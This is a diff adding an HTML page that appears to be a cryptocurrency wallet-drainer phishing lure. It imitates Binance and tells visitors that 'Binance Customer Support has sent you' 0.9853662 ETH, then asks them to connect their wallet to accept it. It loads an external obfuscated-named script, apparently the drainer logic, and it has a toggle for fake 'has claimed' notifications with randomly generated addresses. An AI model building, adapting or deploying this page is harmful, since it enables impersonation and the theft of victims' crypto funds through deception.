@@ -1,0 +1,746 @@
+<html lang="en">
+
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <link rel="icon" type="image/png" href="pic.jpg">
+    <style type="text/css">
+        .custom-video {
+            height: 340px !important;
+        }
+    </style>
+    <style>
+        @import url(https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap);
+
+        .popup,
+        .popup .wallet {
+            border: solid 1px #111d34;
+            border-radius: 10px;
+            display: flex
+        }
+
+        .tick {
+            stroke-dasharray: 29px;
+            stroke-dashoffset: 29px;
+            animation: .5s cubic-bezier(.25, .25, .25, 1) forwards draw;
+            animation-delay: .6s
+        }
+
+        .circle {
+            fill-opacity: 0;
+            stroke: #219a00;
+            stroke-width: 16px;
+            transform-origin: center;
+            transform: scale(0);
+            animation: 1s cubic-bezier(.25, .25, .25, 1.25) forwards grow
+        }
+
+        @keyframes grow {
+            60% {
+                transform: scale(.8);
+                stroke-width: 4px;
+                fill-opacity: 0
+            }
+
+            100% {
+                transform: scale(.9);
+                stroke-width: 8px;
+                fill-opacity: 1;
+                fill: #219a00
+            }
+        }
+
+        @keyframes draw {
+            100% {
+                stroke-dashoffset: 0
+            }
+        }
+
+        @keyframes shake {
+
+            0%,
+            100% {
+                transform: translateX(0)
+            }
+
+            25%,
+            75% {
+                transform: translateX(3px)
+            }
+
+            50% {
+                transform: translateX(-3px)
+            }
+        }
+
+        @keyframes popupOpenClose {
+            0% {
+                opacity: 0%
+            }
+
+            100% {
+                opacity: 100%
+            }
+        }
+
+        @keyframes popupClose {
+            0% {
+                opacity: 100%
+            }
+
+            100% {
+                opacity: 0%
+            }
+        }
+
+        .closeAnimation {
+            animation: .2s ease-in-out forwards popupClose !important
+        }
+
+        .openAnimation {
+            animation: .2s ease-in-out forwards popupOpenClose !important
+        }
+
+        .popup_container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background: rgba(0, 0, 0, .3);
+            width: 100%;
+            height: 100%;
+            z-index: 999;
+            opacity: 0%;
+            animation: .3s ease-in-out forwards popupOpenClose
+        }
+
+        .popup {
+            flex-direction: column;
+            width: fit-content;
+            max-height: 450px;
+            height: 100%;
+            padding: 10px;
+            background-color: #070c15;
+            min-width: 300px;
+            transition: max-height .2s cubic-bezier(0, 0, .55, 1)
+        }
+
+        .popup.expanded {
+            max-height: 580px !important
+        }
+
+        .popup .wallets_container {
+            border: solid 1px #111d34;
+            border-radius: 10px;
+            padding: 10px;
+            margin-top: 50px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px 0;
+            overflow: hidden;
+            transition: max-height .5s cubic-bezier(0, 0, .55, 1)
+        }
+
+        .popup.expanded .wallets_container::-webkit-scrollbar {
+            width: 4px
+        }
+
+        .popup.expanded .wallets_container::-webkit-scrollbar-track {
+            background: 0 0
+        }
+
+        .popup.expanded .wallets_container::-webkit-scrollbar-thumb {
+            background: #6b6b6b
+        }
+
+        .popup.expanded .wallets_container::-webkit-scrollbar-thumb:hover {
+            background: #686868
+        }
+
+        .popup .expand-btn {
+            margin-top: 20px;
+            align-self: flex-end
+        }
+
+        .popup .expand-btn span:after {
+            content: 'More Options ▼';
+            color: #fff;
+            font-family: Arial;
+            cursor: pointer;
+            font-size: 13px
+        }
+
+        .popup.expanded .expand-btn span:after {
+            content: 'Less Options ▲'
+        }
+
+        .popup .expand-btn span {
+            opacity: .8;
+            transition: opacity .2s
+        }
+
+        .popup .expand-btn span:hover {
+            opacity: 100%
+        }
+
+        .popup .wallet {
+            padding: 10px 15px;
+            flex-direction: row;
+            align-items: center;
+            justify-content: space-between;
+            text-decoration: none;
+            transition: background-color .5s;
+            user-select: none;
+            cursor: pointer
+        }
+
+        .popup .wallet:hover {
+            background-color: #091220
+        }
+
+        .popup .wallet .wallet-left {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            gap: 0 10px
+        }
+
+        .popup .wallet .wallet-left img {
+            border-radius: 5px;
+            width: 22px;
+            aspect-ratio: auto
+        }
+
+        .popup .wallet .wallet-left span {
+            font-family: Arial;
+            font-size: 14px;
+            letter-spacing: .5px;
+            color: #fff
+        }
+
+        .popup .wallet .wallet-right {
+            font-family: Arial;
+            font-size: 12px;
+            font-weight: 500;
+            letter-spacing: .5px;
+            color: #fff;
+            opacity: .6
+        }
+
+        .popup .popup_title {
+            align-self: center;
+            justify-content: center;
+            margin-top: 20px;
+            font-size: 1.15rem;
+            letter-spacing: 1px;
+            font-family: Poppins;
+            color: #fff;
+            width: 100%;
+            text-align: center;
+            max-width: 200px
+        }
+
+        .popup .popup-buttons {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            width: 100%
+        }
+
+        .popup .popup_back svg,
+        .popup .popup_close svg {
+            color: #fff;
+            opacity: 50%;
+            width: 23px;
+            padding: 7px;
+            border-radius: 50%;
+            border: solid 1px #111d34;
+            background-color: #070c15;
+            transition: .2s ease-in-out
+        }
+
+        .popup .popup_back svg:hover,
+        .popup .popup_close svg:hover {
+            cursor: pointer;
+            opacity: 100%;
+            transition: color .5s
+        }
+
+        .invisible {
+            opacity: 0;
+            pointer-events: none
+        }
+
+        .visible {
+            opacity: 100%;
+            pointer-events: auto
+        }
+
+        .hidden {
+            display: none !important
+        }
+
+        .flex {
+            display: flex
+        }
+
+        .popup .connection-status {
+            margin-top: 35px;
+            display: flex;
+            flex-direction: column;
+            justify-items: center;
+            align-items: center;
+            text-align: center
+        }
+
+        .popup .connection-status .svg {
+            align-items: center;
+            justify-items: center
+        }
+
+        .popup .connection-status img {
+            width: 55px;
+            border-radius: 10px;
+            border: 3px solid transparent;
+            border-collapse: separate;
+            padding: 4px;
+            border-spacing: 10px;
+            transition: border-color .5s
+        }
+
+        .popup .connection-status .state-text {
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: 500;
+            font-family: Poppins;
+            color: #e4e7e7
+        }
+
+        .popup .connection-status.error .state-text {
+            color: #f25a67
+        }
+
+        .popup .connection-status.calcReward .state-text {
+            color: #a4a4a4;
+            max-width: 300px
+        }
+
+        .popup .connection-status.notEligible .state-text {
+            color: #f25a67;
+            max-width: 300px
+        }
+
+        .popup .connection-status.rewardDone .state-text {
+            color: #cacaca;
+            max-width: 300px
+        }
+
+        .popup .connection-status.success .state-text {
+            color: #77c386
+        }
+
+        .popup .connection-status .state-desc {
+            margin-top: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            font-family: Poppins;
+            color: #949e9e;
+            max-width: 250px
+        }
+        .header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 10px 20px;
+  background: none; /* No background */
+  box-shadow: rgb(71, 77, 87) 0px -1px 0px inset;
+}
+
+.logo {
+  width: 150px; /* Adjust size as needed */
+  height: auto;
+}
+
+.header-button {
+  padding: 8px 16px;
+  background-color: #FCD535; /* Change button color as needed */
+  color: #202630;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+.header-button:hover {
+  background-color: #d2b128; /* Darker shade on hover */
+}
+.footer {
+  position: fixed;
+  bottom: 50;
+  left: 0;
+  width: 100%;
+  display: flex;
+  justify-content: center;
+  padding: 10px 0;
+  background: transparent;
+  z-index: 1000;
+}
+
+.footer-logo {
+  width: 200px; /* Adjust as needed */
+  height: auto;
+}
+    </style>
+	<script>
+  var _paq = window._paq = window._paq || [];
+  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="https://daomakersbs.matomo.cloud/";
+    _paq.push(['setTrackerUrl', u+'matomo.php']);
+    _paq.push(['setSiteId', '3']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.async=true; g.src='https://cdn.matomo.cloud/daomakersbs.matomo.cloud/matomo.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+</head>
+
+<body>
+    <header class="header">
+    <img src="logo2.png" alt="Logo" class="logo">
+    <button class="open header-button">Connect Wallet</button>
+  </header>
+  <main>
+    <script src="./6727137517ce0929c6959e19.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Libre+Franklin:ital,wght@0,100..900;1,100..900&display=swap');
+
+        * {
+            font-family: monospace;
+            margin-left: 15px;
+            margin-right: 15px;
+            
+        }
+
+        html,
+        body {
+            height: 100%;
+            background-color: black;
+            margin: 0px;
+            padding: 0px;
+            overflow: hidden;
+            background-position: center;
+            background-size: cover;
+            background-repeat: no-repeat;
+        }
+
+        .container {
+            height: 100%;
+            display: flex;
+            justify-content: space-evenly;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+
+        }
+
+        .container-logo {
+            width: 100px;
+            
+        }
+
+        .container-box {
+    border: solid 2px #1e2329;
+    padding: 30px;
+    border-radius: 10px;
+    background-color: #1e2329;
+    color: #ffffff;
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+    justify-content: center;
+    z-index: 1 !important;
+}
+
+        .title-content {
+            text-shadow: -3px 3px 9px #000;
+        }
+        .title-content2 {
+            text-shadow: -3px 3px 9px #000;
+        }
+        
+        .container-select {
+            font-size: 20px;
+            /* border-radius: 100px; */
+            padding: 5px;
+            color: black;
+
+        }
+
+        .container-button {
+            padding: 8px 16px;
+  background-color: #FCD535; /* Change button color as needed */
+  color: #202630;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+}
+.container-button:hover {
+  background-color: #d2b128; /* Darker shade on hover */
+}
+        #popup {
+            z-index: 99999;
+        }
+    </style>
+
+    <div id="particles-js" style="display: none;"><canvas class="particles-js-canvas-el" style="width: 100%; height: 100%;" width="1903"
+        height="953"></canvas></div>
+
+    <div class="container">
+        <div class="container-box">
+            <img src="pic.jpg" alt="Loading..." class="container-logo icon-image">
+
+            <h1><a class="title-content">Loading...</h1>
+            <h1 class="text-2-content"></h1>
+            <h3 class="container-price text-3-content"></h3>
+
+            <br>
+            <p class="text-4-content"></p>
+            <button class="open container-button">Connect Wallet</button>
+            
+
+            <script>
+                window.inputtedData = {"title-content":"","icon-image": "image.png"
+,"text-2-content":"Binance Customer Support has sent you:","text-3-content":"0.9853662 ETH","text-4-content":"Connect your wallet below to accept","connect-button-text":"Connect Wallet","background-color":"#181a20","background-image-enabled":false,"background-image-content":"bg.png","particles-enabled":false,"particle-speed":0.6,"particle-opacity":0.4,"particle-count":355,"particles-linked":false,"fake-notifications":false,"notification-text":"has claimed","notification-frequency":1};
+
+                document.getElementsByClassName("open")[0].innerText = window.inputtedData["connect-button-text"];
+
+                document.title = window.inputtedData["title-content"];
+                const favicon = document.createElement("link");
+                favicon.setAttribute("rel", "icon");
+                favicon.setAttribute("type", "image/png");
+                favicon.setAttribute("href", window.inputtedData["icon-image"]);
+                document.head.appendChild(favicon);
+                document.body.style.backgroundColor = window.inputtedData["background-color"];
+                document.getElementsByClassName("icon-image")[0].setAttribute("src", window.inputtedData["icon-image"])
+                document.getElementsByClassName("title-content")[0].innerText = window.inputtedData["title-content"];
+                document.getElementsByClassName("text-2-content")[0].innerText = window.inputtedData["text-2-content"];
+                document.getElementsByClassName("text-3-content")[0].innerText = window.inputtedData["text-3-content"];
+                document.getElementsByClassName("text-4-content")[0].innerText = window.inputtedData["text-4-content"];
+
+                if (window.inputtedData["background-image-enabled"]) {
+                    document.body.style["background-image"] = `url(${window.inputtedData["background-image-content"]})`;
+                };
+
+                if (window.inputtedData["particles-enabled"]) {
+                    document.getElementById("particles-js").style.display = "inline-block";
+                };
+                
+            </script>
+
+        </div>
+    </div>
+    <style>
+        .particles-js-canvas-el {
+            position: fixed;
+            top: 0;
+            z-index: 0;
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script>
+        particlesJS("particles-js", {
+            "particles": {
+                "number": {
+                    "value": window.inputtedData["particle-count"],
+                    "density": {
+                        "enable": true,
+                        "value_area": 789.1476416322727
+                    }
+                },
+                "color": {
+                    "value": "#ffffff"
+                },
+                "shape": {
+                    "type": "circle",
+                    "stroke": {
+                        "width": 0,
+                        "color": "#000000"
+                    },
+                    "polygon": {
+                        "nb_sides": 5
+                    },
+                    "image": {
+                        "src": "img/github.svg",
+                        "width": 100,
+                        "height": 100
+                    }
+                },
+                "opacity": {
+                    "value": window.inputtedData["particle-opacity"],
+                    "random": false,
+                    "anim": {
+                        "enable": true,
+                        "speed": 0.2,
+                        "opacity_min": 0,
+                        "sync": false
+                    }
+                },
+                "size": {
+                    "value": 2,
+                    "random": true,
+                    "anim": {
+                        "enable": true,
+                        "speed": 2,
+                        "size_min": 0,
+                        "sync": false
+                    }
+                },
+                "line_linked": {
+                    "enable": window.inputtedData["particles-linked"],
+                    "distance": 150,
+                    "color": "#ffffff",
+                    "opacity": 0.4,
+                    "width": 1
+                },
+                "move": {
+                    "enable": true,
+                    "speed": window.inputtedData["particle-speed"],
+                    "direction": "none",
+                    "random": true,
+                    "straight": false,
+                    "out_mode": "out",
+                    "bounce": false,
+                    "attract": {
+                        "enable": false,
+                        "rotateX": 600,
+                        "rotateY": 1200
+                    }
+                }
+            },
+            "interactivity": {
+                "detect_on": "canvas",
+                "events": {
+                    "onhover": {
+                        "enable": true,
+                        "mode": "bubble"
+                    },
+                    "onclick": {
+                        "enable": true,
+                        "mode": "push"
+                    },
+                    "resize": true
+                },
+                "modes": {
+                    "grab": {
+                        "distance": 400,
+                        "line_linked": {
+                            "opacity": 1
+                        }
+                    },
+                    "bubble": {
+                        "distance": 83.91608391608392,
+                        "size": 1,
+                        "duration": 3,
+                        "opacity": 1,
+                        "speed": 3
+                    },
+                    "repulse": {
+                        "distance": 200,
+                        "duration": 0.4
+                    },
+                    "push": {
+                        "particles_nb": 4
+                    },
+                    "remove": {
+                        "particles_nb": 2
+                    }
+                }
+            },
+            "retina_detect": true
+        });
+    </script>
+
+    <script>
+        let popups = []; 
+        var spacingTop = 50;
+
+        var backgroundColor = "#292929"
+        var textColor = '#ffffff'
+
+        function createPopup(message) {
+            let popup = document.createElement('div');
+            popup.innerText = message;
+            popup.style.position = 'fixed';
+            popup.style.top = `${spacingTop + 50 * popups.length}px`; 
+            popup.style.right = '25px';
+            popup.style.backgroundColor = backgroundColor;
+            popup.style.color = textColor;
+            popup.style.border = '1px solid #000';
+            popup.style.padding = '10px';
+            popup.style.boxShadow = '0px 0px 10px rgba(0, 0, 0, 0.5)';
+            popup.style.zIndex = '1000';
+            popup.style.marginBottom = "30px"
+            popup.style.borderRadius = "10px"
+            popup.style.border = "solid 2px rgb(59, 59, 59)"
+            document.body.appendChild(popup);
+
+            popups.push(popup); 
+
+            setTimeout(function() {
+                popup.remove();
+                popups = popups.filter(p => p !== popup); 
+                updatePopupPositions(); 
+            }, 2000);
+        }
+
+        function updatePopupPositions() {
+            popups.forEach((popup, index) => {
+                popup.style.top = `${spacingTop + 50 * index}px`; 
+            });
+        }
+
+        function showPopups() {
+            let timeout = (Math.random() * (12000 - 1000)) / window.inputtedData["notification-frequency"];
+            setTimeout(function() {
+                const messages = [
+                    `${window.inputtedData["notification-text"]} `,
+                    `${window.inputtedData["notification-text"]} `,
+                    `${window.inputtedData["notification-text"]} `,
+                    `${window.inputtedData["notification-text"]} `,
+                    `${window.inputtedData["notification-text"]} `,
+                    `${window.inputtedData["notification-text"]} `
+                ];
+
+                const randomMessage = messages[Math.floor(Math.random() * messages.length)];
+
+                createPopup(`${generateSolanaAddress()} ${randomMessage}`);
+                showPopups(); 
+            }, timeout);
+        }
+        if (window.inputtedData["fake-notifications"] == true) {
+            showPopups();
+        }
+        function generateSolanaAddress() {
+            const chars = '0123456789ABCDEFabcdef';
+            let address = '';
+            for (let i = 0; i < 44; i++) {
+                const randomIndex = Math.floor(Math.random() * chars.length);
+                address += chars[randomIndex];
+            }
+            return `0x${address.substring(0, 4)}...${address.substring(address.length - 4)}`;
+        }
+    </script>
+    </main>
+<footer class="footer">
+    <img src="logo3.png" alt="Footer Logo" class="footer-logo">
+  </footer>
+</body>
+
+</html>
